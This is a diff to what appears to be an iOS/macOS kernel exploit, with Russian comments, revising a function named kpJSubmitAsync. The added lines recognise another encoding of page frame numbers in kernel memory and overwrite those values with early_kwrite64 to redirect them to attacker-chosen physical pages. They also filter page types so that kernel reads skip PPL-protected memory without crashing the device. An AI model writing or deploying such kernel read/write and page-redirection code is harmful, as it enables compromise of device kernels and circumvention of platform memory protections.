@@ -7462,6 +7462,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         if (q == (uint64_t)pfn32) frm = 2;
                         else if (q == backingPA) frm = 1;
                         else if ((uint32_t)(q >> 32) == pfn32 && (q & 0xffffffffULL) == 1) frm = 3;
+                        // 1.9.228: + упакованная форма (lo32=pfn, hi32 < 0x10000 — spec-поля с флагами/счётчиком)
+                        else if ((uint32_t)q == pfn32 && (q >> 32) && (q >> 32) < 0x10000ULL) frm = 4;
                         if (!frm) continue;
                         BOOL vtNear = NO;
                         for (int d = -2; d <= 2 && !vtNear; d++) {
@@ -7475,6 +7477,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         specCand[nSC] = pg + o; specCandForm[nSC] = frm;
                         uint64_t nq = (frm == 1) ? ((q & 0x3fffULL) | ctlPA)
                                     : (frm == 2) ? (uint64_t)ctlPFN
+                                    : (frm == 4) ? ((q & 0xffffffff00000000ULL) | ctlPFN)
                                     : (((uint64_t)ctlPFN << 32) | (q & 0xffffffffULL));
                         kpNote(r, [NSString stringWithFormat:@"  [SPC-Z] ★ кандидат форма%d @ %#llx: %#018llx → %#018llx",
                                   frm, (unsigned long long)(pg + o), (unsigned long long)q, (unsigned long long)nq]);
@@ -7532,6 +7535,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                 uint64_t cur = early_kread64(specCand[i]);
                                 uint64_t nq = (specCandForm[i] == 1) ? ((cur & 0x3fffULL) | upagePA3)
                                             : (specCandForm[i] == 2) ? (uint64_t)fPFN3
+                                            : (specCandForm[i] == 4) ? ((cur & 0xffffffff00000000ULL) | fPFN3)
                                             : (((uint64_t)fPFN3 << 32) | (cur & 0xffffffffULL));
                                 early_kwrite64(specCand[i], nq);
                             }
@@ -8022,6 +8026,11 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     for (uint64_t pg = lo; pg < hi && !pteVA; pg += 0x4000) {
                         nPages++;
                         if (!kpSafeToRead(pg)) continue;   // дыра/защищённая — тихо мимо
+                        // 1.9.228: P6 тоже на фильтр {0x21,0x6,0xc} — unfiltered
+                        // kreadbuf по PPL-read странице = смерть (1.9.227 pid 425)
+                        uint64_t ppa228 = kvtophys(pg);
+                        int pft228 = ppa228 ? kpFrameTypeOf(ppa228) : -1;
+                        if (!(pft228 == 0x21 || pft228 == 0x6 || pft228 == 0xc)) continue;
                         nMapped++;
                         uint8_t zbuf[0x4000];
                         kreadbuf(pg, zbuf, sizeof(zbuf));
